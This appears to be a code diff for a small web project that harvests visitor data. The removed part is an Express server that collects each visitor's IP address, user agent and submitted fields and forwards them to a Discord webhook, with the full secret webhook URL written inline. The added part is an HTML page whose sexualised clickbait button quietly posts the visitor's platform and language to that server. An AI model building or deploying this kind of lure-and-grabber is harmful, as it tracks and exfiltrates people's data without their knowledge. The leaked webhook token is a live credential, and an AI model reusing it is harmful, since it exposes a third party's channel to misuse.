@@ -1,30 +1,27 @@
-// server.js
-const express = require("express");
-const fetch = require("node-fetch");
+<!DOCTYPE html>
+<html>
+<body>
 
-const app = express();
-app.use(express.json());
-app.use(express.static("public"));
+<h1>Hello, how is your day?</h1>
+<button onclick="sendData()">See reze twerking</button>
 
-app.post("/send", async (req, res) => {
-  const userData = {
-    ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress,
-    time: new Date().toISOString(),
-    userAgent: req.headers["user-agent"],
-    ...req.body
-  };
-
-  await fetch("https://discord.com/api/webhooks/1493637791349870733/QrizbOWu9-PNTJj0pztpp0KZ9d_tc5NujrBLRry3Qnlupw170_sEfKSZ74EdcVPitSOj", {
+<script>
+async function sendData() {
+  await fetch("/send", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
     body: JSON.stringify({
-      content: "User submitted data:\n" + JSON.stringify(userData, null, 2)
+      platform: navigator.platform,
+      language: navigator.language
     })
   });
 
-  res.json({ status: "ok" });
-});
+  alert("Dirty dirty");
+}
+</script>
 
-app.listen(3000, () => console.log("Running on port 3000"));
+</body>
+</html>
+
